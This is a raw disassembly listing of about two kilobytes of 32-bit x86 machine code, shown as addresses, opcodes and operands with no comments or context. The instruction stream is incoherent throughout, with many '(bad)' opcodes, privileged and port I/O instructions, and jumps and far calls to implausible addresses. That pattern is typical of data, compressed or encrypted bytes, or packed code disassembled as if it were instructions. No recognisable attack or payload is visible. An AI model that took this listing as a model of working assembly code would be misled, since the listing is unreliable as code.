  416631:	shl    DWORD PTR [esi-0x7b],cl
  416634:	cmp    al,0x1b
  416636:	mov    esi,0x12e1a909
  41663b:	adc    DWORD PTR [edx-0x518e6ae1],esp
  416641:	jge    0x416622
  416643:	loopne 0x4166b2
  416645:	popf   
  416646:	xor    edi,DWORD PTR [eax]
  416648:	cli    
  416649:	add    eax,0x340d67ff
  41664e:	es pop ds
  416650:	(bad)  
  416651:	jns    0x416617
  416653:	test   al,0x7
  416655:	int    0x1a
  416657:	and    DWORD PTR [edx-0x3f],0xa1b30fe0
  41665e:	dec    eax
  41665f:	mov    edi,DWORD PTR [eax+0x6f]
  416662:	adc    bl,BYTE PTR [esi-0x7d253113]
  416668:	cmp    ah,BYTE PTR [eax+0x4a]
  41666b:	cmp    BYTE PTR [esi-0x3be4279b],bl
  416671:	fs ret 
  416673:	js     0x41663a
  416675:	inc    eax
  416676:	fnstsw WORD PTR [eax+0x60]
  416679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41667a:	addr16 xchg ebx,eax
  41667c:	out    0x75,eax
  41667e:	inc    esi
  41667f:	pop    edx
  416680:	les    esp,FWORD PTR [edx+ebp*4+0x40]
  416684:	ja     0x4166bf
  416686:	and    eax,0x6521c39f
  41668b:	or     DWORD PTR [esp+eax*8-0x21],edi
  41668f:	xlat   BYTE PTR ds:[ebx]
  416690:	jae    0x416618
  416692:	ror    DWORD PTR ds:0xcf744e2b,cl
  416698:	test   BYTE PTR [eax],bl
  41669a:	add    ebp,eax
  41669c:	test   eax,0x8096ad96
  4166a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166a2:	cmp    esp,esi
  4166a4:	push   eax
  4166a5:	retf   
  4166a6:	scas   al,BYTE PTR es:[edi]
  4166a7:	cmc    
  4166a8:	mov    al,0x7e
  4166aa:	std    
  4166ab:	adc    ebp,ecx
  4166ad:	ja     0x4166b7
  4166af:	mov    ebp,0xdbb4c143
  4166b4:	mov    eax,ds:0x4b7e02ee
  4166b9:	rcr    DWORD PTR [edx],1
  4166bb:	js     0x416683
  4166bd:	je     0x41669f
  4166bf:	je     0x416671
  4166c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c2:	xchg   edi,eax
  4166c3:	stc    
  4166c4:	repz (bad) 
  4166c6:	outs   dx,BYTE PTR ds:[esi]
  4166c7:	out    dx,al
  4166c8:	mov    esi,0x6a23a4c6
  4166cd:	or     BYTE PTR [ecx+0x3ec57363],0x4a
  4166d4:	popf   
  4166d5:	jl     0x416729
  4166d7:	and    DWORD PTR [eax-0xbac6163],esi
  4166dd:	jl     0x4166f4
  4166df:	iret   
  4166e0:	jl     0x416741
  4166e2:	retf   
  4166e3:	(bad)  
  4166e4:	fistp  WORD PTR [edi+ecx*8]
  4166e7:	outs   dx,DWORD PTR ds:[esi]
  4166e8:	push   edi
  4166e9:	and    eax,0x5fe0ca9f
  4166ee:	cld    
  4166ef:	ror    DWORD PTR [edx-0x69],0xa4
  4166f3:	iret   
  4166f4:	ret    0x13e7
  4166f7:	jmp    0x96193f2c
  4166fc:	enter  0x4b89,0xe6
  416700:	ret    
  416701:	push   ss
  416702:	in     eax,0x2f
  416704:	and    bh,dl
  416706:	shr    BYTE PTR [edi+0x66],cl
  416709:	adc    DWORD PTR [ebx+0xb],ebp
  41670c:	lock cmp BYTE PTR [esi+eax*4-0x47],al
  416711:	pop    ds
  416712:	mov    ecx,0xb84a872e
  416717:	pop    es
  416718:	jge    0x416781
  41671a:	push   ebp
  41671b:	jp     0x416784
  41671d:	fwait
  41671e:	sbb    ebx,DWORD PTR [edx]
  416720:	mov    bh,0x19
  416722:	mov    esp,0x4dc05bd5
  416727:	mov    BYTE PTR [ebx],bl
  416729:	sub    bh,dl
  41672b:	(bad)  
  41672c:	mov    DWORD PTR [ebx],ecx
  41672e:	cdq    
  41672f:	adc    DWORD PTR [esi+0x6e],edx
  416732:	sbb    DWORD PTR [esi+ebp*1+0x2b61d78a],ebp
  416739:	mov    ds:0xcf06b91b,eax
  41673e:	and    dh,BYTE PTR [eax+esi*4+0x3]
  416742:	add    ecx,DWORD PTR [ecx+0x3fabfb87]
  416748:	mov    ah,0xb6
  41674a:	pop    ebp
  41674b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41674c:	fisub  DWORD PTR [esi-0x40]
  41674f:	mov    ch,0x45
  416751:	mov    ecx,0xc7a1d98b
  416756:	int3   
  416757:	xor    eax,0x6b9edae7
  41675c:	(bad)  
  41675d:	xor    BYTE PTR [edx+ebp*2-0x11c50956],0xa4
  416765:	pop    ecx
  416766:	add    dl,BYTE PTR [ebp+0x71]
  416769:	push   edx
  41676a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41676b:	jae    0x416780
  41676d:	ds mov ah,0xea
  416770:	aaa    
  416771:	leave  
  416772:	sbb    eax,0x26e6d409
  416777:	mov    eax,0xe9878405
  41677c:	jnp    0x41670b
  41677e:	test   eax,0x8aa43a0e
  416783:	into   
  416784:	jne    0x4167ee
  416786:	test   DWORD PTR [ebp-0x4c9373b1],ebp
  41678c:	jecxz  0x4167dd
  41678e:	sbb    BYTE PTR [esp+ebp*4+0x6e],bl
  416792:	mov    esi,0xc6ffdd6a
  416797:	sub    dl,ah
  416799:	call   0xdaa7:0x2f0181dd
  4167a0:	enter  0xa78a,0x28
  4167a4:	out    dx,al
  4167a5:	mov    ebx,DWORD PTR [ecx-0x70]
  4167a8:	xor    eax,0xa23bdb1c
  4167ad:	jbe    0x416809
  4167af:	xor    al,0x66
  4167b1:	adc    eax,0x900171e3
  4167b6:	sub    cl,bh
  4167b8:	mov    esp,0x221a52e
  4167bd:	and    eax,0xb747e77
  4167c2:	adc    BYTE PTR [ebp+0x50],ah
  4167c5:	pop    ss
  4167c6:	ins    DWORD PTR es:[edi],dx
  4167c7:	je     0x41675e
  4167c9:	inc    edx
  4167ca:	lock cmp BYTE PTR [ebp+0x9],dl
  4167ce:	sahf   
  4167cf:	push   ebp
  4167d0:	dec    ecx
  4167d1:	jmp    0x77ac99d1
  4167d6:	mov    ebp,0x913cd64f
  4167db:	inc    edi
  4167dc:	inc    edx
  4167dd:	addr16 push cs
  4167df:	mov    ah,BYTE PTR [edx+0x75002646]
  4167e5:	pop    es
  4167e6:	jmp    0x416769
  4167e8:	test   DWORD PTR [ebx-0x79],edi
  4167eb:	or     eax,0x9851c77
  4167f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f1:	jmp    0xe29e6a0e
  4167f6:	fucomi st,st(0)
  4167f8:	push   edi
  4167f9:	fisub  DWORD PTR [ecx-0x67]
  4167fc:	repnz push ebp
  4167fe:	outs   dx,DWORD PTR ds:[esi]
  4167ff:	imul   edi,DWORD PTR [edx],0xffffffee
  416802:	sub    BYTE PTR [esi+0x5c],bl
  416805:	test   ch,al
  416807:	push   0xa30429be
  41680c:	or     al,0xea
  41680e:	sub    cl,BYTE PTR [esi+0x59]
  416811:	test   DWORD PTR [esi+edi*4-0x73],0xd3cadc6b
  416819:	pushf  
  41681a:	mov    BYTE PTR [esi+0x5f],al
  41681d:	sahf   
  41681e:	fild   QWORD PTR [ebx]
  416820:	adc    edi,DWORD PTR [ebp+0x67856aec]
  416826:	out    dx,al
  416827:	leave  
  416828:	stos   DWORD PTR es:[edi],eax
  416829:	inc    ecx
  41682a:	je     0x416810
  41682c:	or     al,0xca
  41682e:	dec    ebp
  41682f:	dec    esi
  416830:	cmp    eax,0x70f5ac70
  416835:	jmp    0x4167fc
  416837:	adc    al,0xe
  416839:	and    eax,0xa60473c7
  41683e:	mov    bl,ah
  416840:	jmp    0x4167c4
  416842:	out    0x9f,al
  416844:	adc    esp,DWORD PTR ds:0x946c6632
  41684a:	sbb    eax,0xe5f9ce4e
  41684f:	push   es
  416850:	jo     0x4167fe
  416852:	je     0x416870
  416854:	stc    
  416855:	adc    DWORD PTR [esp+edi*1-0x66],0x9ae1eaf2
  41685d:	aas    
  41685e:	push   0xc7c3702b
  416863:	arpl   dx,di
  416865:	ja     0x416831
  416867:	enter  0xf216,0x2e
  41686b:	pop    es
  41686c:	test   DWORD PTR [esi-0x3e0fd930],0xfa1f11e7
  416876:	outs   dx,DWORD PTR ds:[esi]
  416877:	cmp    al,0x7d
  416879:	mov    eax,0x9cc49a20
  41687e:	cmp    eax,0x19ef221c
  416883:	mov    dh,0x66
  416885:	and    BYTE PTR [ebp+0x8],ah
  416888:	sbb    ecx,DWORD PTR [ecx]
  41688a:	jg     0x416860
  41688c:	pop    ecx
  41688d:	pop    ebp
  41688e:	leave  
  41688f:	inc    esi
  416890:	std    
  416891:	sub    BYTE PTR [edi+ebp*4],cl
  416894:	test   al,0x6b
  416896:	or     BYTE PTR [esi+0xd],0x7f
  41689a:	test   DWORD PTR [edx-0x1f646250],esi
  4168a0:	je     0x416913
  4168a2:	cdq    
  4168a3:	jbe    0x4168ab
  4168a5:	jge    0x4168ef
  4168a7:	push   eax
  4168a8:	or     ebx,DWORD PTR [edi]
  4168aa:	xchg   DWORD PTR [ecx-0x25],ebx
  4168ad:	pushf  
  4168ae:	xor    edx,DWORD PTR [esi]
  4168b0:	std    
  4168b1:	fwait
  4168b2:	pop    edi
  4168b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b4:	ins    BYTE PTR es:[edi],dx
  4168b5:	push   ecx
  4168b6:	fiadd  DWORD PTR [ebx-0x53a78b5b]
  4168bc:	aam    0xaf
  4168be:	popf   
  4168bf:	push   ebp
  4168c0:	fimul  WORD PTR [esi+0x2e]
  4168c3:	mov    eax,ds:0x945051db
  4168c8:	adc    dh,0xfe
  4168cb:	mov    dh,0x3d
  4168cd:	lea    ebp,[esi-0x783e2e5c]
  4168d3:	xor    BYTE PTR [ebp-0x69],bl
  4168d6:	sbb    BYTE PTR [ebx+0x54f618ac],dl
  4168dc:	in     eax,0xf8
  4168de:	cmp    dl,BYTE PTR [esi-0x46]
  4168e1:	aam    0x10
  4168e3:	shl    BYTE PTR [eax+eax*2],0x62
  4168e7:	push   esp
  4168e8:	and    al,0xd1
  4168ea:	pop    edi
  4168eb:	pop    es
  4168ec:	cmp    edi,DWORD PTR [eax+0x49]
  4168ef:	mov    ds:0x50236da1,eax
  4168f4:	vrcpss xmm4,xmm3,xmm2
  4168f8:	lock sub BYTE PTR [ebp-0x58],bh
  4168fc:	pop    ebx
  4168fd:	pop    esi
  4168fe:	aas    
  4168ff:	shr    BYTE PTR [eax],0x5c
  416902:	ror    BYTE PTR [esi+0x18],1
  416905:	std    
  416906:	mov    DWORD PTR [ecx+0x55],0x20ebfc19
  41690d:	and    dl,BYTE PTR [edi]
  41690f:	xchg   edi,eax
  416910:	sub    cl,cl
  416912:	add    eax,0x9e6070cf
  416917:	adc    esp,ecx
  416919:	push   ds
  41691a:	(bad)  
  41691c:	ins    BYTE PTR es:[edi],dx
  41691d:	inc    esi
  41691e:	nop
  41691f:	sub    DWORD PTR ds:0x29084b79,0x19
  416926:	xlat   BYTE PTR ds:[ebx]
  416927:	xor    BYTE PTR [eax-0x7239dd9d],ah
  41692d:	retf   
  41692e:	test   DWORD PTR [edi],0xa0e06b8
  416934:	and    DWORD PTR [ebx],esi
  416936:	les    ebp,FWORD PTR [edx+0x79]
  416939:	addr16 push 0xfffffffd
  41693c:	mov    ebx,0x23094121
  416941:	add    eax,0x10e9866d
  416946:	mov    WORD PTR [edi+esi*1],ds
  416949:	sub    eax,0x4ede8e06
  41694e:	aaa    
  41694f:	pop    esp
  416950:	adc    al,0xfe
  416952:	xor    DWORD PTR [ecx],ecx
  416954:	sbb    al,0x32
  416956:	mov    edi,0x42a894ee
  41695b:	(bad)  
  41695c:	out    0x7a,al
  41695e:	adc    BYTE PTR [ebx+ebp*8],cl
  416961:	cmp    ah,0xf
  416964:	(bad)  
  416966:	cmp    al,0x7b
  416968:	mov    dh,0xbd
  41696a:	pcmpgtw mm2,QWORD PTR [edx]
  41696d:	cmp    ebx,edi
  41696f:	and    BYTE PTR [esi+0x4e],0x31
  416973:	jl     0x41690c
  416975:	cmp    DWORD PTR [ebp-0x15],0x4301dc95
  41697c:	(bad)  
  41697d:	imul   ebp,esp,0xffffffe3
  416980:	inc    eax
  416981:	enter  0x3889,0x2c
  416985:	(bad)  
  416986:	ds retf 0xc6c6
  41698a:	mov    ebx,0x2f5b1da
  41698f:	xchg   esi,eax
  416990:	test   DWORD PTR [ebx],0xeb447b65
  416996:	pop    eax
  416997:	sbb    BYTE PTR [ebp-0x1cdc1590],0xad
  41699e:	in     eax,0x2d
  4169a0:	dec    edi
  4169a1:	loopne 0x416984
  4169a3:	or     DWORD PTR [ebx],ecx
  4169a5:	inc    ebx
  4169a6:	mov    ds:0x131fbe71,al
  4169ab:	scas   al,BYTE PTR es:[edi]
  4169ac:	mov    DWORD PTR [ecx+0x3648a932],esi
  4169b2:	cld    
  4169b3:	push   edx
  4169b4:	pop    bp
  4169b6:	add    BYTE PTR [edx+0x15],bh
  4169b9:	sbb    al,0x24
  4169bb:	mov    bl,0x3e
  4169bd:	mov    esp,0x2c77c4ec
  4169c2:	pop    esp
  4169c3:	sar    DWORD PTR ds:0x8896fe7c,cl
  4169c9:	mov    ds:0x789df44c,al
  4169ce:	cs dec esi
  4169d0:	mul    dl
  4169d2:	dec    eax
  4169d3:	repz aas 
  4169d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d6:	add    BYTE PTR [edx-0x38449db6],bl
  4169dc:	push   ds
  4169dd:	adc    edi,ebp
  4169df:	push   es
  4169e0:	mov    ebx,0x850dbcc9
  4169e5:	pusha  
  4169e6:	jge    0x416a0b
  4169e8:	sbb    eax,0x93a7a86e
  4169ed:	rcl    BYTE PTR ds:0xc61436c3,cl
  4169f3:	mov    esp,0x70f90a9d
  4169f8:	mov    ecx,DWORD PTR [edx+0x1b]
  4169fb:	nop
  4169fc:	lods   ax,WORD PTR ds:[esi]
  4169fe:	iret   
  4169ff:	cmc    
  416a00:	inc    eax
  416a01:	fild   WORD PTR [edi]
  416a03:	xchg   esp,eax
  416a04:	leave  
  416a05:	out    0x47,eax
  416a07:	cdq    
  416a08:	cmp    al,0x56
  416a0a:	data16 sbb BYTE PTR [edx+0x1d],ah
  416a0e:	sub    bh,bl
  416a10:	cmp    eax,0xff38886d
  416a15:	in     eax,dx
  416a16:	in     al,dx
  416a17:	data16 jecxz 0x41699e
  416a1a:	xchg   ecx,eax
  416a1b:	loop   0x4169db
  416a1d:	ret    
  416a1e:	aaa    
  416a1f:	stos   DWORD PTR es:[edi],eax
  416a20:	neg    DWORD PTR [edi-0x7c79a315]
  416a26:	int3   
  416a27:	adc    ebp,DWORD PTR [esp+ecx*4+0x47]
  416a2b:	sub    DWORD PTR [eax],edx
  416a2d:	scas   al,BYTE PTR es:[edi]
  416a2e:	test   DWORD PTR [edx+0x72],ebp
  416a31:	loopne 0x4169ce
  416a33:	pop    ds
  416a34:	fadd   QWORD PTR [edi-0x5fb44c50]
  416a3a:	mov    cl,0xe6
  416a3c:	(bad)  
  416a3d:	(bad)  
  416a3e:	int    0xc6
  416a40:	(bad)  
  416a41:	sti    
  416a42:	lds    edx,FWORD PTR [edx+0x4e0708b1]
  416a48:	and    edi,DWORD PTR [edx+0x3c87f707]
  416a4e:	xor    ch,BYTE PTR [eax-0x110dbfcb]
  416a54:	add    DWORD PTR [esi],ebp
  416a56:	mov    bl,bh
  416a58:	and    BYTE PTR [esi],bh
  416a5a:	xor    al,0xc3
  416a5c:	and    DWORD PTR [ebx-0x70bc3a8c],0x2db20776
  416a66:	popf   
  416a67:	push   cs
  416a68:	sub    eax,0x8440d40b
  416a6d:	sahf   
  416a6e:	es sub ah,bl
  416a71:	xor    DWORD PTR [esi+eiz*1],esp
  416a74:	dec    eax
  416a75:	sti    
  416a76:	add    BYTE PTR [ebx+edx*2],dl
  416a79:	daa    
  416a7a:	stc    
  416a7b:	and    al,0x41
  416a7d:	jo     0x416a56
  416a7f:	add    eax,0x82423d81
  416a84:	cmp    eax,ebp
  416a86:	jp     0x416a37
  416a88:	out    0x54,eax
  416a8a:	mov    dh,0x8f
  416a8c:	push   ds
  416a8d:	jbe    0x416ac1
  416a8f:	ins    DWORD PTR es:[edi],dx
  416a90:	adc    ebp,DWORD PTR [edi+edi*2+0x6c]
  416a94:	in     eax,0x14
  416a96:	xor    al,0x46
  416a98:	sub    DWORD PTR [edx+eiz*4+0x1a666965],ebp
  416a9f:	inc    BYTE PTR [ebp+eiz*8-0x67]
  416aa3:	xor    BYTE PTR [ecx+eiz*8],dh
  416aa6:	xchg   ebp,eax
  416aa7:	ficomp WORD PTR [ebx-0x1a]
  416aaa:	fidivr WORD PTR [edi-0x7f]
  416aad:	ret    
  416aae:	xor    ecx,DWORD PTR [esi+0x6e9cf1ba]
  416ab4:	fimul  WORD PTR [ecx]
  416ab6:	pop    ebx
  416ab7:	add    eax,0x6d7ee14d
  416abd:	or     esp,DWORD PTR [edi+0x51]
  416ac0:	mov    ds:0x76f80be8,eax
  416ac5:	pop    eax
  416ac6:	inc    esp
  416ac7:	in     eax,dx
  416ac8:	sub    al,0xac
  416aca:	fwait
  416acb:	xor    bh,BYTE PTR [ebp+0x7b]
  416ace:	out    dx,al
  416acf:	push   esi
  416ad0:	adc    ch,BYTE PTR [ebx+0x7421420d]
  416ad6:	or     ecx,DWORD PTR [eax-0x2]
  416ad9:	push   es
  416ada:	adc    al,0x74
  416adc:	loopne 0x416af2
  416ade:	dec    ebx
  416adf:	das    
  416ae0:	mov    ds:0xb10dcc73,al
  416ae5:	lahf   
  416ae6:	imul   ebp,DWORD PTR [edx+0x3710c969],0x2a
  416aed:	jp     0x416b01
  416aef:	cmc    
  416af0:	xor    edi,DWORD PTR [edi]
  416af2:	pop    ebp
  416af3:	(bad)  
  416af4:	sub    al,0x7a
  416af6:	jnp    0x416b75
  416af8:	push   esp
  416af9:	sar    BYTE PTR [esi+ebx*4],1
  416afc:	jecxz  0x416b2f
  416afe:	xchg   edi,eax
  416aff:	mov    WORD PTR [edx+0x214867f0],es
  416b05:	xor    BYTE PTR [esp+ecx*4-0x26],dl
  416b09:	int    0xcf
  416b0b:	ret    0x550a
  416b0e:	jb     0x416b83
  416b10:	lock mov bh,bl
  416b13:	add    esi,edx
  416b15:	mov    edi,0x27b2c605
  416b1a:	mov    al,0x2b
  416b1c:	xor    DWORD PTR [esi],0xffffffb1
  416b1f:	pop    esi
  416b20:	loop   0x416b98
  416b22:	stc    
  416b23:	pop    esi
  416b24:	cli    
  416b25:	jne    0x416af4
  416b27:	xlat   BYTE PTR ds:[ebx]
  416b28:	idiv   DWORD PTR [ebp*1+0x45a77dda]
  416b2f:	fsub   DWORD PTR [ebp+0x43]
  416b32:	jno    0x416b36
  416b34:	shr    BYTE PTR [ecx+0x39fcd96f],cl
  416b3a:	ja     0x416b8f
  416b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b3d:	leave  
  416b3e:	add    DWORD PTR [ecx+edi*2],0xffffffab
  416b42:	std    
  416b43:	mov    edx,0xa803e38f
  416b48:	int    0x38
  416b4a:	repz mov ah,al
  416b4d:	cmp    eax,0xe7f5998f
  416b52:	outs   dx,BYTE PTR ds:[esi]
  416b53:	cmc    
  416b54:	add    BYTE PTR [eax-0x7f],ch
  416b57:	icebp  
  416b58:	test   dh,bh
  416b5a:	sbb    edi,eax
  416b5c:	push   edx
  416b5d:	jp     0x416ba0
  416b5f:	and    eax,0xa7917146
  416b64:	int3   
  416b65:	int3   
  416b66:	out    0xb3,al
  416b68:	inc    ebp
  416b69:	cmp    ebx,DWORD PTR [ecx+0x355eb43b]
  416b6f:	xor    ebx,DWORD PTR fs:[ebp-0x9]
  416b73:	xor    al,0x46
  416b75:	leave  
  416b76:	rol    ebx,0x28
  416b79:	ds (bad) 
  416b7b:	adc    al,BYTE PTR [ebx+0x53cd6f0f]
  416b81:	sub    eax,DWORD PTR [ebp+0x1546eadf]
  416b87:	sub    al,0x2a
  416b89:	shr    BYTE PTR [esp+ebx*1+0x59398bb3],1
  416b90:	xchg   DWORD PTR [edi-0x46],ebp
  416b93:	ret    
  416b94:	add    edx,ebp
  416b96:	scas   al,BYTE PTR es:[edi]
  416b97:	adc    DWORD PTR [esi+0x25],0x33eea9c3
  416b9e:	in     al,dx
  416b9f:	sbb    al,0x7d
  416ba1:	xor    eax,0xd466c01a
  416ba6:	pop    edx
  416ba7:	icebp  
  416ba8:	adc    eax,0x8c11c8ca
  416bad:	adc    ecx,DWORD PTR [eax-0x51f372b9]
  416bb3:	push   eax
  416bb4:	imul   ebx,DWORD PTR gs:[edi-0x64],0x701a112a
  416bbc:	icebp  
  416bbd:	xor    eax,0xf0161cb7
  416bc2:	mov    WORD PTR [edx],?
  416bc4:	or     eax,0x6c4f8fb0
  416bc9:	push   edx
  416bca:	adc    BYTE PTR [eax-0x6751ccfe],al
  416bd0:	inc    esi
  416bd1:	xor    BYTE PTR [ebx+0x342224e],al
  416bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd8:	dec    edx
  416bd9:	mov    dh,cl
  416bdb:	push   0x43
  416bdd:	adc    DWORD PTR [ebx+0x431c90f5],esp
  416be3:	shl    BYTE PTR [eax+0x60],0x9f
  416be7:	xchg   esp,eax
  416be8:	add    al,0xcd
  416bea:	popf   
  416beb:	push   0xb927d7d5
  416bf0:	mov    bh,0xf6
  416bf2:	cld    
  416bf3:	int3   
  416bf4:	(bad)  
  416bf5:	in     eax,0xbf
  416bf7:	outs   dx,DWORD PTR ds:[esi]
  416bf8:	scas   eax,DWORD PTR es:[edi]
  416bf9:	add    DWORD PTR [ecx-0x40],edi
  416bfc:	into   
  416bfd:	jno    0x416bd3
  416bff:	push   es
  416c00:	icebp  
  416c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c02:	leave  
  416c03:	aas    
  416c04:	jmp    0x4d74:0x1ee3eb10
  416c0b:	xchg   edi,eax
  416c0c:	xchg   ebp,eax
  416c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0e:	in     al,0x36
  416c10:	cmp    al,0xe6
  416c12:	iret   
  416c13:	jae    0x416c76
  416c15:	sub    dl,BYTE PTR [eax]
  416c17:	lods   eax,DWORD PTR ds:[esi]
  416c18:	mov    gs,ebp
  416c1a:	pop    esi
  416c1b:	mov    ecx,0xc039c477
  416c20:	repnz or esi,DWORD PTR [ecx+0x1d]
  416c24:	xchg   ebx,eax
  416c25:	xchg   edi,eax
  416c26:	push   ebx
  416c27:	add    BYTE PTR [ebx-0x9],bl
  416c2a:	addr16 lahf 
  416c2c:	pop    ss
  416c2d:	or     BYTE PTR [ebx-0x50],0x88
  416c31:	int    0xae
  416c33:	(bad)  
  416c34:	lock sub dl,BYTE PTR [edx-0x5f8c6318]
  416c3b:	mov    BYTE PTR [edx],ah
  416c3d:	mov    ah,0xfd
  416c3f:	inc    edx
  416c40:	lock and cl,BYTE PTR [esi+0x290df64b]
  416c47:	dec    ebp
  416c48:	sub    BYTE PTR [eax+0x12],0x6d
  416c4c:	scas   eax,DWORD PTR es:[edi]
  416c4d:	pop    esi
  416c4e:	sub    ecx,DWORD PTR [edx]
  416c50:	cli    
  416c51:	xchg   esi,eax
  416c52:	adc    ebp,eax
  416c54:	enter  0xd012,0x57
  416c58:	sbb    al,0x2c
  416c5a:	out    0x5f,al
  416c5c:	and    bl,BYTE PTR [ecx]
  416c5e:	push   edx
  416c5f:	aaa    
  416c60:	mov    edi,0xf94330c2
  416c65:	push   eax
  416c66:	rol    dh,0x1d
  416c69:	xchg   edx,eax
  416c6a:	add    eax,0x30efcfe
  416c6f:	mov    edi,0xcfef7a4
  416c74:	xor    DWORD PTR [eax-0x35],ebp
  416c77:	sbb    DWORD PTR [eax+0x51cbfe69],edi
  416c7d:	ins    DWORD PTR es:[edi],dx
  416c7e:	and    al,BYTE PTR [ebp+ebx*1+0x44bbbb9f]
  416c85:	inc    edx
  416c86:	test   al,0x6e
  416c88:	mov    edi,0x663af902
  416c8d:	jbe    0x416cf6
  416c8f:	pop    ebp
  416c90:	int3   
  416c91:	xchg   ebp,eax
  416c92:	lods   al,BYTE PTR ds:[esi]
  416c93:	xchg   DWORD PTR [edx-0x44dddac],edi
  416c99:	ja     0x416c69
  416c9b:	std    
  416c9c:	xlat   BYTE PTR ds:[ebx]
  416c9d:	outs   dx,BYTE PTR ds:[esi]
  416c9e:	ins    BYTE PTR es:[edi],dx
  416c9f:	(bad)  fs:[ebp+0x4b]
  416ca3:	scas   eax,DWORD PTR es:[edi]
  416ca4:	push   esi
  416ca5:	rcr    esi,cl
  416ca7:	push   ss
  416ca8:	push   0xd570a47b
  416cad:	push   ds
  416cae:	dec    esp
  416caf:	inc    ebx
  416cb0:	icebp  
  416cb1:	out    dx,al
  416cb2:	sbb    DWORD PTR [edx-0x19],edi
  416cb5:	xor    edi,edx
  416cb7:	lahf   
  416cb8:	(bad)  
  416cb9:	or     BYTE PTR [eax+0x41],dh
  416cbc:	cmp    DWORD PTR [ebx],ecx
  416cbe:	pop    ebx
  416cbf:	pop    ss
  416cc0:	dec    edx
  416cc1:	adc    eax,0xf0907e23
  416cc6:	cmp    BYTE PTR ds:[ebx-0x15],cl
  416cca:	aaa    
  416ccb:	retf   
  416ccc:	push   cs
  416ccd:	jge    0x416ced
  416ccf:	xchg   DWORD PTR [ebx+0x79858659],esp
  416cd5:	iret   
  416cd6:	mov    edx,0xa6b8b978
  416cdb:	adc    bh,BYTE PTR [ebp-0x24]
  416cde:	jmp    0x416cb8
  416ce0:	loop   0x416c78
  416ce2:	out    dx,al
  416ce3:	call   0xc39b6fbf
  416ce8:	push   0x94e8eca6
  416ced:	or     BYTE PTR [esi+0x7d8d22e6],bh
  416cf3:	stos   DWORD PTR es:[edi],eax
  416cf4:	jnp    0x416d63
  416cf6:	(bad)  
  416cf7:	pop    eax
  416cf8:	and    al,0xdf
  416cfa:	iret   
  416cfb:	and    ebp,DWORD PTR [esi-0x2d8cc6df]
  416d01:	add    BYTE PTR [ebx+eiz*1-0x5b90d5b5],ah
  416d08:	(bad)  
  416d09:	cs jecxz 0x416d81
  416d0c:	rcl    BYTE PTR [esi],0x57
  416d0f:	or     al,0x7a
  416d11:	in     eax,0x6f
  416d13:	mov    bh,BYTE PTR [esi+0x5c]
  416d16:	inc    ecx
  416d17:	add    eax,0x73fc06c6
  416d1c:	or     DWORD PTR [edx],ecx
  416d1e:	in     eax,0xa2
  416d20:	mov    esp,0x4447ce0a
  416d25:	mov    bl,0xac
  416d27:	and    eax,0x567be383
  416d2c:	xor    al,0x96
  416d2e:	pop    ebp
  416d2f:	loop   0x416cea
  416d31:	aam    0x1a
  416d33:	push   esi
  416d34:	push   edx
  416d35:	push   eax
  416d36:	shr    DWORD PTR [edi+edx*8],0x8b
  416d3a:	repz loop 0x416d4d
  416d3d:	jmp    FWORD PTR [eax+0x64]
  416d40:	mov    edx,0xec2cbeb6
  416d45:	arpl   WORD PTR [ecx+esi*4-0x5cac18cf],bx
  416d4c:	test   eax,0xa5cdd30f
  416d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d52:	sub    cl,BYTE PTR [edx+0x7ba371d3]
  416d58:	das    
  416d59:	sbb    edx,DWORD PTR [edx+0x1c]
  416d5c:	retf   
  416d5d:	mov    esp,0xe412794d
  416d62:	mov    eax,0x4c1a7ace
  416d67:	xchg   ecx,eax
  416d68:	(bad)  
  416d69:	std    
  416d6a:	xchg   ebx,esp
  416d6c:	cmp    al,0x20
  416d6e:	cs retf 
  416d70:	repnz and DWORD PTR [eax+0xa],ebp
  416d74:	and    edi,0xebcf4531
  416d7a:	or     eax,0x276e27c1
  416d7f:	hlt    
  416d80:	ja     0x416dec
  416d82:	cmp    esi,eax
  416d84:	push   esp
  416d85:	and    eax,0x3eb85820
  416d8a:	dec    eax
  416d8b:	sbb    eax,0x82d69a2a
  416d90:	sub    BYTE PTR [edi+0x289b8911],dl
  416d96:	inc    sp
  416d98:	mov    ch,BYTE PTR [ebp+0x14d2f288]
  416d9e:	adc    dl,BYTE PTR [esi+0x71]
  416da1:	out    0xd8,al
  416da3:	adc    al,0x98
  416da5:	icebp  
  416da6:	inc    edx
  416da7:	pushf  
  416da8:	xchg   esi,eax
  416da9:	cmp    DWORD PTR [edi+0x71d92435],0x77d40022
  416db3:	xchg   DWORD PTR ds:0x8d988398,edx
  416db9:	jbe    0x416de9
  416dbb:	sub    BYTE PTR [eax],ch
  416dbd:	push   ds
  416dbe:	jo     0x416e36
  416dc0:	outs   dx,BYTE PTR ds:[esi]
  416dc1:	lea    ecx,[edi+ecx*1-0x6]
  416dc5:	or     DWORD PTR [bx+si],esi
  416dc8:	pop    ecx
  416dc9:	jg     0x416daa
  416dcb:	sbb    BYTE PTR [edx],dh
  416dcd:	gs cmp ebp,esi
  416dd0:	jmp    0x416e14
  416dd2:	cmp    al,0xc8
  416dd4:	fst    QWORD PTR ds:0x413d4353
  416dda:	mov    ch,0x73
  416ddc:	cmp    BYTE PTR [esi+0x9d4d10e],0xd6
  416de3:	mov    esp,0x5fbfd667
  416de8:	enter  0xc3bb,0xbc
  416dec:	push   ds
  416ded:	push   esp
  416dee:	mov    esi,0xeee185fd
  416df3:	sub    ch,bl
  416df5:	call   0x9417:0x673e8231
  416dfc:	test   BYTE PTR [esi],ah
  416dfe:	test   BYTE PTR [ebx+0x432ba492],al
  416e04:	out    dx,eax
  416e05:	ret    
  416e06:	cmp    esi,edi
  416e08:	fiadd  WORD PTR [edi+0x9]
  416e0b:	xor    BYTE PTR [edi-0x5f],bh
